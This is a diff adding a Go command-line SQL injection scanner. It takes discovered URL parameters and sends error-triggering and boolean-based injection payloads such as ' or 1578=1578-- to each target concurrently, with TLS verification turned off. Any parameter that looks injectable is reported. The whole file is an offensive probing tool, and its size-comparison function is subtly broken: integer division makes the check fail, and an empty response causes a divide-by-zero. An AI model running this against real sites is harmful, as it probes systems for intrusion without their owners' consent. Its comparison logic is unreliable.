@@ -1,0 +1,422 @@
+package main
+
+import (
+	"crypto/tls"
+	"encoding/json"
+	"errors"
+	"flag"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"net/url"
+	"os"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/PuerkitoBio/goquery"
+	"github.com/google/go-cmp/cmp"
+	"github.com/michael1026/param-sqli/util"
+	"github.com/projectdiscovery/fastdialer/fastdialer"
+)
+
+type CookieInfo map[string]string
+type ArjunResult struct {
+	Params []string `json:"params"`
+}
+
+type ArjunResults map[string]ArjunResult
+
+type UrlParam struct {
+	url    string
+	params []string
+}
+
+type Baseline struct {
+	Url           string
+	ErrorCount    int
+	ContentLength int
+	Reflections   int
+}
+
+func main() {
+	filePath := flag.String("i", "", "file path for input file")
+	threads := flag.Int("t", 20, "Number of concurrent threads to use")
+	flag.Parse()
+	client := buildHttpClient()
+	ar := readParameterJson(filePath)
+	wg := &sync.WaitGroup{}
+
+	if ar == nil {
+		return
+	}
+
+	for i := 0; i < *threads; i++ {
+		wg.Add(1)
+
+		go worker(ar, client, wg)
+	}
+
+	close(*ar)
+
+	wg.Wait()
+}
+
+func addQueryToURL(parsedUrl url.URL, parameter string, payload string) url.URL {
+	q := parsedUrl.Query()
+	q.Add(parameter, payload)
+	parsedUrl.RawQuery = q.Encode()
+	return parsedUrl
+}
+
+func readParameterJson(filepath *string) *chan UrlParam {
+	jsonFile, err := os.Open(*filepath)
+	var arjunResults ArjunResults
+
+	if err != nil {
+		fmt.Printf("Error reading JSON: %s\n", err)
+		return nil
+	}
+
+	defer jsonFile.Close()
+
+	bytes, _ := ioutil.ReadAll(jsonFile)
+
+	err = json.Unmarshal(bytes, &arjunResults)
+
+	if err != nil {
+		// fmt.Printf("Unmarshal error: %s\n", err)
+		return nil
+	}
+
+	urlParams := make(chan UrlParam, len(arjunResults))
+
+	for rawUrl, params := range arjunResults {
+		urlParams <- UrlParam{rawUrl, params.Params}
+	}
+
+	return &urlParams
+}
+
+func worker(ar *chan UrlParam, client *http.Client, wg *sync.WaitGroup) {
+	defer wg.Done()
+	for urlParam := range *ar {
+		// There shouldn't be over 100 parameters found for a single endpoint
+		// so let's just consider this invalid and skip the results
+
+		if len(urlParam.params) > 100 {
+			continue
+		}
+		for _, param := range urlParam.params {
+			parsedUrl, parseErr := url.Parse(urlParam.url)
+
+			if parseErr != nil {
+				return
+			}
+
+			scanner(parsedUrl, param, client)
+		}
+	}
+}
+
+func errorDetection(parsedUrl *url.URL, param string, client *http.Client) (int, error) {
+	payload := "wrtqva'"
+
+	newUrl := addQueryToURL(*parsedUrl, param, payload)
+	doc, err := makeRequestGetDocument(newUrl.String(), client)
+	if err != nil {
+		return 0, errors.New("Request unsuccessful")
+	}
+
+	return countErrors(doc)
+}
+
+func getRequestResponseInfo(parsedUrl *url.URL, param string, payload string, client *http.Client) (Baseline, error) {
+	baseline := Baseline{}
+
+	newUrl := addQueryToURL(*parsedUrl, param, payload)
+	doc, err := makeRequestGetDocument(newUrl.String(), client)
+
+	if err != nil || doc == nil {
+		return baseline, errors.New("Error making baseline request")
+	}
+
+	errorCount, err := countErrors(doc)
+
+	if err != nil {
+		return baseline, errors.New("Error counting errors")
+	}
+
+	html, err := doc.Html()
+
+	if err != nil {
+		return baseline, errors.New("Error reading HTML")
+	}
+
+	baseline.ContentLength = len(html)
+	baseline.Url = parsedUrl.String()
+	baseline.ErrorCount = errorCount
+	baseline.Reflections = countReflections(doc, payload)
+
+	return baseline, nil
+}
+
+func countErrors(doc *goquery.Document) (int, error) {
+	html, err := doc.Html()
+
+	if err != nil {
+		return 0, err
+	}
+
+	count := 0
+
+	errors := []string{
+		"error in your SQL syntax",
+		"mysql_numrows()",
+		"Input String was not in a correct format",
+		"mysql_fetch",
+		"Error Executing Database Query",
+		"Unclosed quotation mark",
+	}
+
+	for _, error := range errors {
+		count += strings.Count(html, error)
+	}
+
+	return count, nil
+}
+
+func scanner(parsedUrl *url.URL, param string, client *http.Client) {
+	baseline1, err := getRequestResponseInfo(parsedUrl, param, util.RandString(5), client)
+
+	if err != nil {
+		return
+	}
+
+	baseline2, err := getRequestResponseInfo(parsedUrl, param, util.RandString(5), client)
+
+	if err != nil {
+		// fmt.Printf("URL is unstable\n")
+		return
+	}
+
+	if !cmp.Equal(baseline1, baseline2) {
+		// fmt.Printf("URL is unstable\n")
+		return
+	}
+
+	baseline3, err := getRequestResponseInfo(parsedUrl, param, util.RandString(5), client)
+
+	if !cmp.Equal(baseline2, baseline3) {
+		// fmt.Printf("URL is unstable\n")
+		return
+	}
+
+	errorCount, err := errorDetection(parsedUrl, param, client)
+
+	if err != nil {
+		// possibly sqli?
+		return
+	}
+
+	if errorCount > baseline1.ErrorCount {
+		fmt.Println(parsedUrl.String() + " in \"" + param + "\" (found extra error in response)")
+		return
+	}
+
+	if singleQuoteSQLiCheck(baseline1, parsedUrl, param, client) {
+		return
+	}
+
+	if doubleQuoteSQLiCheck(baseline1, parsedUrl, param, client) {
+		return
+	}
+}
+
+func doubleQuoteSQLiCheck(baseline Baseline, parsedUrl *url.URL, param string, client *http.Client) bool {
+	trueStatement, err := getRequestResponseInfo(parsedUrl, param, "\" or 1578=1578--", client)
+
+	if err != nil {
+		return false
+	}
+
+	trueStatement2, err := getRequestResponseInfo(parsedUrl, param, "\" or 9852=9852--", client)
+
+	if err != nil {
+		return false
+	}
+
+	if !cmp.Equal(trueStatement, trueStatement2) {
+		return false
+	}
+
+	trueStatement3, err := getRequestResponseInfo(parsedUrl, param, "\" or 1184=1184--", client)
+
+	if err != nil {
+		return false
+	}
+
+	if !cmp.Equal(trueStatement, trueStatement3) {
+		return false
+	}
+
+	falseStatement, err := getRequestResponseInfo(parsedUrl, param, "\" and 1576=1578--", client)
+
+	if err != nil {
+		return false
+	}
+
+	if sizesSignificantlyDifferent(trueStatement3.ContentLength, falseStatement.ContentLength) || falseStatement.Reflections != trueStatement3.Reflections {
+		fmt.Println(parsedUrl.String() + " in \"" + param + "\" (boolean based \" or 1=1--)")
+		return true
+	}
+
+	trueStatement4, err := getRequestResponseInfo(parsedUrl, param, "\" or \"9852\"=\"9852", client)
+
+	if err != nil {
+		return false
+	}
+
+	falseStatement2, err := getRequestResponseInfo(parsedUrl, param, "\" and \"1576\"=\"1578", client)
+
+	if err != nil {
+		return false
+	}
+
+	if sizesSignificantlyDifferent(trueStatement4.ContentLength, falseStatement2.ContentLength) || trueStatement4.Reflections != falseStatement2.Reflections {
+		fmt.Println(parsedUrl.String() + " in \"" + param + "\" (boolean based \" or \"1\"=\"1)")
+		return true
+	}
+
+	return false
+}
+
+func singleQuoteSQLiCheck(baseline Baseline, parsedUrl *url.URL, param string, client *http.Client) bool {
+	trueStatement, err := getRequestResponseInfo(parsedUrl, param, "' or 1578=1578--", client)
+
+	if err != nil {
+		return false
+	}
+
+	trueStatement2, err := getRequestResponseInfo(parsedUrl, param, "' or 9852=9852--", client)
+
+	if err != nil {
+		return false
+	}
+
+	if !cmp.Equal(trueStatement, trueStatement2) {
+		return false
+	}
+
+	trueStatement3, err := getRequestResponseInfo(parsedUrl, param, "' or 1154=1154--", client)
+
+	if err != nil {
+		return false
+	}
+
+	if !cmp.Equal(trueStatement, trueStatement3) {
+		return false
+	}
+
+	falseStatement, err := getRequestResponseInfo(parsedUrl, param, "' and 1576=1578--", client)
+
+	if err != nil {
+		return false
+	}
+
+	if sizesSignificantlyDifferent(trueStatement3.ContentLength, falseStatement.ContentLength) || falseStatement.Reflections != trueStatement3.Reflections {
+		fmt.Println(parsedUrl.String() + " in \"" + param + "\" (boolean based ' or 1=1--)")
+		return true
+	}
+
+	trueStatement4, err := getRequestResponseInfo(parsedUrl, param, "' or '9852'='9852", client)
+
+	if err != nil {
+		return false
+	}
+
+	falseStatement2, err := getRequestResponseInfo(parsedUrl, param, "' and '4576'='1578", client)
+
+	if err != nil {
+		return false
+	}
+
+	if sizesSignificantlyDifferent(trueStatement4.ContentLength, falseStatement2.ContentLength) || trueStatement4.Reflections != falseStatement2.Reflections {
+		fmt.Println(parsedUrl.String() + " in \"" + param + "\" (boolean based ' or '1'='1)")
+		return true
+	}
+
+	return false
+}
+
+func sizesSignificantlyDifferent(one int, two int) bool {
+	if ((two / one) * 100) > 110 {
+		return true
+	} else if ((one / two) * 100) > 110 {
+		return true
+	}
+	return false
+}
+
+func buildHttpClient() (c *http.Client) {
+	fastdialerOpts := fastdialer.DefaultOptions
+	fastdialerOpts.EnableFallback = true
+	dialer, err := fastdialer.NewDialer(fastdialerOpts)
+	if err != nil {
+		fmt.Printf("Error building HTTP client: %s\n", err)
+		return
+	}
+
+	transport := &http.Transport{
+		MaxIdleConns:      -1,
+		IdleConnTimeout:   time.Second,
+		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+		DisableKeepAlives: true,
+		DialContext:       dialer.Dial,
+	}
+
+	re := func(req *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	}
+
+	client := &http.Client{
+		Transport:     transport,
+		CheckRedirect: re,
+		Timeout:       time.Second * 5,
+	}
+
+	return client
+}
+
+func makeRequestGetDocument(rawUrl string, client *http.Client) (doc *goquery.Document, err error) {
+	req, err := http.NewRequest("GET", rawUrl, nil)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Connection", "close")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+
+	defer resp.Body.Close()
+
+	doc, err = goquery.NewDocumentFromReader(resp.Body)
+
+	if err != nil {
+		return nil, err
+	}
+
+	return doc, nil
+}
+
+func countReflections(doc *goquery.Document, canary string) int {
+	html, err := doc.Html()
+
+	if err != nil {
+		fmt.Printf("Error converting to HTML: %s\n", err)
+	}
+
+	return strings.Count(html, canary)
+}
